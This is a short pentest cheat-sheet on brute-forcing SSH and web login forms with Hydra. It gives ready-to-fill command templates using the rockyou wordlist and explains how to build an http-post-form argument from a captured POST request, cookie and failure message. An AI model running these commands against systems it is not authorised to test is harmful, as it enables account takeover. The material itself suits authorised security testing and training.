# HYDRA: BRUTE FORCE ATTACKS
#### SSH
```text
hydra -l [username] -P /usr/share/wordlists/rockyou.txt ssh://[target_ip_address] -t 4
```
#### Webpage Logins
For this method you will need to capture a POST to the login page using Burp Suite (this can also be done viewing the page source).
#### EXAMPLE
This is based on a brute force using an admin username.

To create the 'http-post-form' argument you will need to do the following:
- Add in the POST string and close it off with a colon ':' (e.g /Account/Login.aspx: or use the full post /Account/login.aspx?ReturnURL=/admin)
- Copy and paste in the cookie (the text contained in the large red box in the image above) and separat it with a colon ':'
- Copy and paste the error message which is displayed from a failed login (refer to the actual webpage for this); combined it will be something like this:
```text
"[post-details]:[then-copy-and-paste-the-cookie]:[then-enter-the-failure-message]"
"/Account/login.aspx:[all-of-the-cookie-information]:Incorrect username or password"
```

```text
hydra -l [username] -P [password list] [target ip-address] http-post-form "[login form details]:[failure message]"
```
